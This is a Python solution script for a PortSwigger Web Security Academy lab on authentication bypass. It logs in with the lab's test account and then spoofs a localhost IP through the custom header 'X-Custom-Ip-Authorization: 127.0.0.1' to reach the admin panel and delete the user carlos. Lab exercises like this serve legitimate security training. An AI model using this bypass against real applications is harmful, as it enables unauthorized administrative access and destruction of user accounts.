###############################################################################
#
# Author: Ahmed Elqalawy (@elqal3awii)
#
# Date: 3/9/2023
#
# Lab: Authentication bypass via information disclosure
#
# Steps: 1. Fetch /login page
#        2. Extract the session and the csrf token
#        3. Login as wiener
#        4. Extract the new session
#        5. Bypass admin access using custom header
#        6. Delete carlos
#
###############################################################################


###########
# imports
###########
import requests
import re
from colorama import Fore


#########
# Main
#########

# change this to your lab URL
url = "https://0a710055048cd4d3803a8f80000300af.web-security-academy.net"

try:  
    # fetch /login page
    get_login = requests.get(f"{url}/login")

except:
    print(Fore.RED + "[!] Failed to GET /login page through exception")
    exit(1)


print(Fore.WHITE + "1. Fetching /login page.. " + Fore.GREEN + "OK")

# extract the session
session = get_login.cookies.get("session")  

# extract the csrf token
csrf = re.findall("csrf.+value=\"(.+)\"", get_login.text)[0]

print(Fore.WHITE + "2. Getting session and csrf token.. " + Fore.GREEN + "OK")

# data to send via POST
data = {
    "username": "wiener",
    "password": "peter",
    "csrf": csrf
}

# set session cookie
cookies = {
    "session": session
}

try:
    # try to login as wiener
    post_login = requests.post(f"{url}/login", data, cookies=cookies, allow_redirects=False)  

except:
    print(Fore.RED + "[!] Failed to login through exception")
    exit(1)

# if login is successful, a redirect will occur
if post_login.status_code == 302:
    print(Fore.WHITE + "3. Logging in as wiener.. " + Fore.GREEN + "OK")
    
    # extract the new session
    new_session = post_login.cookies.get("session")  
    
    print(Fore.WHITE + "4. Getting a new session as wiener.. " + Fore.GREEN + "OK")
    
    # set session cookie
    cookies = {
        "session": new_session
    }

    # set headers
    headers = {
        # bypass the admin access using this header
        "X-Custom-Ip-Authorization": "127.0.0.1"
    }

    try:
        # delete carlos
        delete_carlos = requests.get(f"{url}/admin/delete?username=carlos", headers=headers, cookies=cookies) 
   
    except:
        print(Fore.RED + "[!] Failed to delete carlos through exception")
        exit(1)

    print(Fore.WHITE + "5. Bypassing admin access using custom header.. " + Fore.GREEN + "OK")
    print(Fore.WHITE + "6. Deleting carlos.. " + Fore.GREEN + "OK")
    print(Fore.WHITE + "🗹 Check your browser, it should be marked now as " + Fore.GREEN + "solved")

else:
    print(Fore.RED + "[!] Failed to login as wiener")


